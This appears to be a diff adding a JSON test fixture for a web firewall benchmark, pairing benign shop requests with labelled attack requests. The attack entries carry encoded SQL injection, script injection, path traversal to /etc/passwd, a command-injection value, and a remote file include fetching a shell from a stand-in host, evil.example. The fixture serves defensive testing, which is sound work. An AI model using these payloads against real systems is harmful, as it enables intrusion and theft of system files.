@@ -1,0 +1,128 @@
+{
+  "schema": 1,
+  "requests": [
+    {
+      "id": "allow_get_search",
+      "class": "allow",
+      "method": "GET",
+      "path": "/products/search",
+      "query": "q=desk-lamp&page=1&sort=asc",
+      "protocol": "HTTP/1.1",
+      "headers": [
+        ["Host", "benchmark.local"],
+        ["User-Agent", "LuminaIronBenchmark/10"],
+        ["Accept", "text/html,application/xhtml+xml"]
+      ],
+      "body": ""
+    },
+    {
+      "id": "attack_get_sqli",
+      "class": "attack",
+      "category": "sqli",
+      "method": "GET",
+      "path": "/products/search",
+      "query": "q=1%27%20OR%201%3D1--&page=1",
+      "protocol": "HTTP/1.1",
+      "headers": [
+        ["Host", "benchmark.local"],
+        ["User-Agent", "LuminaIronBenchmark/10"],
+        ["Accept", "text/html,application/xhtml+xml"]
+      ],
+      "body": ""
+    },
+    {
+      "id": "attack_get_xss",
+      "class": "attack",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "protocol": "HTTP/1.1",
+      "headers": [["Host", "benchmark.local"], ["User-Agent", "LuminaIronBenchmark/10"], ["Accept", "text/html"]],
+      "body": ""
+    },
+    {
+      "id": "attack_get_lfi",
+      "class": "attack",
+      "category": "lfi",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..%2F..%2F..%2Fetc%2Fpasswd",
+      "protocol": "HTTP/1.1",
+      "headers": [["Host", "benchmark.local"], ["User-Agent", "LuminaIronBenchmark/10"], ["Accept", "text/plain"]],
+      "body": ""
+    },
+    {
+      "id": "attack_get_rce",
+      "class": "attack",
+      "category": "rce",
+      "method": "GET",
+      "path": "/tools",
+      "query": "host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd",
+      "protocol": "HTTP/1.1",
+      "headers": [["Host", "benchmark.local"], ["User-Agent", "LuminaIronBenchmark/10"], ["Accept", "text/plain"]],
+      "body": ""
+    },
+    {
+      "id": "attack_get_rfi",
+      "class": "attack",
+      "category": "rfi",
+      "method": "GET",
+      "path": "/include",
+      "query": "page=http%3A%2F%2Fevil.example%2Fshell.txt",
+      "protocol": "HTTP/1.1",
+      "headers": [["Host", "benchmark.local"], ["User-Agent", "LuminaIronBenchmark/10"], ["Accept", "text/html"]],
+      "body": ""
+    },
+    {
+      "id": "allow_product_detail",
+      "class": "allow",
+      "method": "GET",
+      "path": "/products/desk-lamp",
+      "query": "variant=black&currency=EUR",
+      "protocol": "HTTP/1.1",
+      "headers": [["Host", "benchmark.local"], ["User-Agent", "LuminaIronBenchmark/10"], ["Accept", "text/html"]],
+      "body": ""
+    },
+    {
+      "id": "allow_api_page",
+      "class": "allow",
+      "method": "GET",
+      "path": "/api/v1/catalog",
+      "query": "page=2&limit=24&category=lighting",
+      "protocol": "HTTP/1.1",
+      "headers": [["Host", "benchmark.local"], ["User-Agent", "LuminaIronBenchmark/10"], ["Accept", "application/json"]],
+      "body": ""
+    },
+    {
+      "id": "allow_encoded_search",
+      "class": "allow",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=lampa%20biurkowa&lang=pl",
+      "protocol": "HTTP/1.1",
+      "headers": [["Host", "benchmark.local"], ["User-Agent", "LuminaIronBenchmark/10"], ["Accept", "text/html"]],
+      "body": ""
+    },
+    {
+      "id": "allow_static_asset",
+      "class": "allow",
+      "method": "GET",
+      "path": "/assets/app.css",
+      "query": "v=20260717",
+      "protocol": "HTTP/1.1",
+      "headers": [["Host", "benchmark.local"], ["User-Agent", "LuminaIronBenchmark/10"], ["Accept", "text/css,*/*;q=0.1"]],
+      "body": ""
+    },
+    {
+      "id": "allow_health",
+      "class": "allow",
+      "method": "GET",
+      "path": "/healthz",
+      "query": "check=ready",
+      "protocol": "HTTP/1.1",
+      "headers": [["Host", "benchmark.local"], ["User-Agent", "LuminaIronBenchmark/10"], ["Accept", "application/json"]],
+      "body": ""
+    }
+  ]
+}
